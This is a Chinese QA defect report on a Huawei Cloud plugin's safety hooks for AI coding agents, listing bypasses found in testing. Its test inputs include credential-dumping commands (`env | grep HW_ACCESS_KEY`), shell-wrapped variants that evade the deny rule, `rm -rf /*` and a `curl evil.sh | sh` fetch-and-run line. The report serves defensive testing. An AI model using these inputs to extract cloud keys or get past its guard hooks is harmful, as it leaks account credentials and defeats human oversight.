# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-09-23-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：`2026-09-23 16:58`（北京时间）
> **被测版本**：`v1.1.7-next.0`（npm @next，gitHead `0790e92a`）
> **本清单是统一提单脚本的解析输入**：`scripts/file_issue.py` 硬编码解析标题与「根因」字段，格式严格遵循。
>
> **版本差异说明**：v1.1.7-next.0 相对 v1.1.6 仅版本号/插件 manifest 格式/tight（`plugins/huaweicloud-core/src/` 字节级零改动），本轮缺陷均为 v1.1.6 已报告的复现；**本轮新增/纠正 2 项**：D4-23「全局规则未注入」由误判 BLOCKED 纠正为 FAIL（源码可证），D9-9「capabilities.cancellation 未声明」由 BLOCKED 纠正为 SPEC-MISMATCH（protocol-probe 实测）。其余 10 项均为历史缺陷复现。

---

## #1【P0】D4-2 凭证 env 打印拦截未覆盖 `HW_` 前缀

- **现象**：v1.1.7-next.0 复测——`printenv HW_SECRET_KEY` 返回 `deny risk=credential`（已修复），但 `env | grep HW_ACCESS_KEY`、`env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。对照 `env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确 `deny`。
- **断言**：`env | grep HW_ACCESS_KEY` 应返回 `deny`（识别华为云凭证 env 并拦截）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398-399` env-dump 关键字正则 `/HUAWEICLOUD|HWC_|HCLOUD|OS_/i` 仍缺 `HW_` 前缀；新增规则只覆盖 `$HW_*` 引用与 `printenv HW_*`，未覆盖 `env | grep HW_*` 管道形态。
- **影响**：可借 `env | grep HW_ACCESS_KEY` 提取 AK/SK 明文，凭证红线缺口。
- **证据**：`evidence/D4-2/stdout.txt`（classify-probe）
- **状态**：历史查重命中，不重复提单

## #2【P0】D4-16 env-dump 规则被 shell 包裹穿透

- **现象**：v1.1.7-next.0 复测——`sh -c "hcloud ecs DeleteServer --force"`、`sh -c "cat ~/.config/huaweicloud/credentials.json"` 均 `deny`（shell 解包已生效）；但 `sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`bash -c "printenv HUAWEICLOUD_SDK_AK"`、`eval "env | grep HUAWEICLOUD_ACCESS_KEY"` 仍 `allow risk=not_huaweicloud`。对照裸命令 `env | grep HUAWEICLOUD_ACCESS_KEY` 正确 `deny`。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应返回 `deny`（解开 shell 包裹后识别内层 env-dump）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398` env-dump 检测 `(^|\s)(env|printenv|...)` 依赖词边界，`sh -c "..."` 使内层 `env` 前为引号而非词边界；stripExecutable 解包只作用于 hcloud 参数分类，未回溯到 env-dump 文本规则。
- **影响**：shell 包裹仍可绕过 env-dump 预检。
- **证据**：`evidence/D4-16/stdout.txt`（classify + wrap-probe）
- **状态**：历史查重命中，不重复提单

## #3【P0】D4-21 hook_check_artifacts 未拦截 HCL 形态 broad IAM 制品

- **现象**：v1.1.7-next.0 复测——`evaluateArtifacts` 对 HCL `resource "huaweicloud_iam_policy" ... statement { effect="Allow" actions = ["*"] resources=["*"] }` 返回 `decision=allow`、findings 空；JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:179-196`（规则 `hwc-iam-admin-policy`）regex 只覆盖 JSON 形态（`"Action"\s*:\s*"*"`）与 `Action = *`，未覆盖 HCL 小写复数 `actions = ["*"]`（带方括号列表）与 `effect="Allow"`（小写+引号）形态。
- **影响**：Terraform IaC broad IAM 绕过制品预检。
- **证据**：`evidence/D4-21/stdout.txt`（hook + hcl-probe）
- **状态**：历史查重命中，不重复提单

## #4【P0】D4-23 全局规则 huawei-agent-rules.mdc 未注入任何安装目标

- **现象**：v1.1.7-next.0 实测——隔离安装 `install --target hermes`（HOME+HERMES_HOME 双隔离）后，产物仅含 `safety/rules/cloud-risk-rules.json`，仓库根 `rules/huawei-agent-rules.mdc`（含 MUST 约束）**未注入**任何安装目标；源码 `plugins/huaweicloud-core/src/` 对 `huawei-agent-rules`/`.mdc` **零引用**。
- **断言**：install --target 后应把 `rules/huawei-agent-rules.mdc` 注入对应目标（系统提示/规则），且「禁直连 csms/kms」MUST 约束可执行、无孤儿文件。
- **根因**：`plugins/huaweicloud-core/src/setup-cli.mjs:829-840`（及 openclaw ~904-918 / codex ~1008-1018 / 其它 target ~1067-1078 安装分支）：安装产物复制清单仅 copyDir `src`/`safety`/`skills`/`commands`，缺仓库根 `rules/`（`huawei-agent-rules.mdc`）——非环境阻塞，源码可证。
- **影响**：全局 MUST 约束（禁直连 csms/kms 等）未随安装注入，11 个安装目标的安全规则形同虚设。
- **证据**：`evidence/D4-23/stdout.txt` + `evidence/D4-23/probe.mjs`（源码零引用 + 隔离安装产物无 .mdc）
- **状态**：本轮纠正 BLOCKED → FAIL；历史查重按 file_issue.py 处置

## #5【P1】D4-17 hook 模糊输入 fail-open（默认放行）

- **现象**：v1.1.7-next.0 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` —— `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无规则命中时默认 `allow`。
- **影响**：无法解析/规则未命中的命令与制品在预检阶段被放行（fail-open）。
- **证据**：`evidence/D4-17/stdout.txt`（supplement-probe）
- **状态**：历史查重命中，不重复提单

## #6【P1】D10-3 serviceCatalog 中文意图路由缺失（21.4% 准确率，D3-S5/S6/S7 同根因）

- **现象**：v1.1.7-next.0 复测——`eval/harness/run-eval.mjs` 对 15 条中文评测集 HIT=3 MISS=11 N/A=1（21.4%）。新增场景用例同根因复现：D3-S5「物联网+时序+前端托管」→ 无命中；D3-S6「部署 Python 函数定时执行」→ 无命中（FunctionGraph 未路由）；D3-S7「带 MySQL 的 Web 应用」→ 仅命中 RDS（`MySQL` 关键字），部署目标未命中。
- **断言**：`serviceCatalog` 中文意图应命中对应服务（评测级准确率 ≥90%）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1817-1946` `serviceCatalog` 的 `routeMap` —— 23 条路由仅 sandbox 与 voucher 含 CJK 关键字，其余仅英文；中文意图无法命中 → 回退 `Run hcloud --help`。
- **影响**：中文用户意图在服务发现/路由环节大面积未命中（21.4% << 90%），并导致复合意图场景（S5/S6/S7）多路命中/分层推荐失效。
- **证据**：`evidence/D10-3/stdout.txt`（routing + eval-harness）+ `evidence/D3-S5/stdout.txt` + `evidence/D3-S6/stdout.txt` + `evidence/D3-S7/stdout.txt`
- **状态**：历史查重命中 #705/#689，不重复提单

## #7【P1】D4-27 redactSecrets/redactOutput 字符串路径脱敏缺口（裸 token / admin-pass 变体）

- **现象**：v1.1.7-next.0 直调复测 5 项断言 2 PASS / 3 FAIL——对象路径 `redactSecrets({token:...})` 与 `redactOutput(JSON)` 正确脱敏；但字符串路径 `redactSecrets('token=T0K3N_...')` 泄漏裸 `token=`；`--admin-pass=AdminP@ss_...`（连字符变体）未脱敏；`redactOutput` 非 JSON 回退同源泄漏 `token=`。
- **断言**：`redactSecrets`（字符串/对象）与 `redactOutput`（JSON/非 JSON）两条路径对 AK/SK/token/password/adminPass/secret_key 均无明文残留。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:34` `redactString` key=value 正则白名单缺裸 `token` 关键字；`adminPass` 仅字面 camelCase，未覆盖 `admin_pass`/`admin-pass` 变体。
- **影响**：redactSecrets 字符串路径与 redactOutput 非 JSON 回退对 `token=`/`admin-pass` 形态明文泄漏。
- **证据**：`evidence/D4-27/stdout.txt`（D4-27-probe）
- **状态**：历史查重命中 #726，不重复提单

## #8【P1】D9-9 capabilities.cancellation 未声明（协议取消能力契约漂移）

- **现象**：v1.1.7-next.0 protocol-probe（extended-probe）直调——initialize 返回 `capabilities = {"tools":{}}`，`capabilities.cancellation` **缺失**；取消通知后/重建后 `tools/list` 均 = 40、initialize ok、无悬挂请求（④ 通过）。
- **断言**：按用例 D9-9 口径「取消能力按 capabilities 实测（不存在 → SPEC-MISMATCH 标注而非假定）」——取消能力未声明即契约漂移；②③ 的 30s 延迟注入 / 2s 取消窗口需可注入延迟夹具（真·外部依赖）未覆盖。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs`（initialize 响应 capabilities 构造处未声明 `cancellation`）。
- **影响**：MCP 客户端无法获知取消能力 → 无法依赖 notifications/cancelled 语义，超时取消路径不可用。
- **证据**：`evidence/D9-9/stdout.txt`（extended-probe）
- **状态**：本轮纠正 BLOCKED → SPEC-MISMATCH；历史查重按 file_issue.py 处置

## #9【P2】D4-25 Python hook 写操作遥测分类误判为 cli:invoke

- **现象**：v1.1.7-next.0 实测 `hooks/huaweicloud-safety.py` `record_cli_event`——只读 `hcloud ecs ListServersDetails` → `cli:read`（正确）；写 `hcloud vpc CreateVpc` → `cli:invoke`（应为 `cli:write`）；`hcloud help` → `cli:invoke`（正确）。
- **断言**：写操作 `hcloud <svc> <Create/Delete/Update...>` 应分类为 `cli:write`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置捕获组 `(^|[A-Za-z0-9])` 要求写操作前缀前是「行首或字母数字」，但实际 `hcloud vpc CreateVpc` 中操作名 `CreateVpc` 前是空格（服务名 `vpc`），故永不匹配；应改用 `\b` 词边界。
- **影响**：Python hook 端写操作遥测被误分类，`hook-events.jsonl` 的 `cli:write` 事件缺失，遥测/审计失真（Node 端无此问题）。
- **证据**：`evidence/D4-25/stdout.txt`（new-safety-probe）
- **状态**：历史查重命中 #752，不重复提单

## #10【P2】D4-26 findings.evidence 脱敏未覆盖 JSON 带引号 key（明文 secret_key/adminPass 泄漏）

- **现象**：v1.1.7-next.0 直调 `risk-rule-engine.evaluateArtifacts`——触发 `hwc-iam-admin-policy`（deny）的 JSON 制品含 `"secret_key":"SKSECRETVALUE9"`、`"adminPass":"MyP@ss12345"` 时，`findings[].evidence` 原样保留明文（仅 access_key 被部分脱敏）。
- **断言**：findings.evidence 中 AK/SK/token/password 均被 `<redacted>` 替换，不泄露明文。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19` `redactEvidence` 的捕获组要求「键名 + 可空白 + `[:=]`」紧邻（如 `adminPass=xxx`），JSON 形态 `"adminPass":"xxx"` 键与 `:` 之间隔着 `"`，正则不匹配 → 明文残留。
- **影响**：制品/部署计划预检触发的 findings.evidence 在 JSON 形态下泄漏明文密码/AK/SK。
- **证据**：`evidence/D4-26/stdout.txt`（new-safety-probe）
- **状态**：历史查重命中 #761，不重复提单

## #11【P2】D1-68 区域环境变量优先级与用例契约漂移（SPEC-MISMATCH）

- **现象**：用例 D1-68 契约称「HUAWEICLOUD_REGION 优先于 HW_REGION 作为默认 region」，实现 `auth/credentials.mjs` 实际为 `HW_REGION || HUAWEICLOUD_REGION`（HW_REGION 优先）。实测 `getServiceIcon` 离线分支（ICONS_OFFLINE=1 → source=snapshot）正常。
- **断言**：契约「HUAWEICLOUD_REGION 优先于 HW_REGION」与实际实现「HW_REGION 优先」不一致（漂移点）。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:133,261,284` —— `let region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''` 及 server.env/server.environment 两处同构，均将 `HW_REGION` 置于 `HUAWEICLOUD_REGION` 之前。
- **影响**：当两环境变量同时设置时，`HW_REGION` 生效而非 `HUAWEICLOUD_REGION`，与测试用例/文档契约相反（可能为用例文案与实现描述不一致，需维护者确认哪侧为准）。
- **证据**：`evidence/D1-68/stdout.txt`（new-env-probe）
- **状态**：历史查重命中 #765，不重复提单

## #12【P2】D8-9 安装 ID 遥测值 sanitizeValue 未脱敏 AK/SK/token（SPEC-MISMATCH）

- **现象**：v1.1.7-next.0 直调 `telemetry.sanitizeValue`——`sanitizeValue('AK=ABC123DEF456GHI')` 原样返回 `"AK=ABC123DEF456GHI"`；`sanitizeValue('access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET')` 原样保留 AK/SK/token 明文。installId 生成/恢复稳定持久（len=64，二次调用一致）正常。
- **断言**：用例 D8-9 契约「sanitizeValue 移除 AK/SK/token 等敏感值与非法字符」——敏感值应替换为 `<redacted>`。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189-196` `sanitizeValue` 仅做 `replace(/[\r\n\t]+/g,' ')+trim+超长截断`（移除控制字符/截断），无任何 AK/SK/token/password 敏感值脱敏逻辑（telemetry 事件值经 `buildEvent` 原样上送）。
- **影响**：遥测事件值若携带命令参数/环境值中的 AK/SK/token，将以明文进入遥测上送，凭证泄漏风险（与 D4-27 安全侧脱敏是两条独立路径，此处为遥测侧）。
- **证据**：`evidence/D8-9/stdout.txt`（new-config-probe）
- **状态**：历史查重命中 #752（AtomCode/Linux 已提单「D8-9 sanitizeValue 未移除敏感值」），不重复提单

---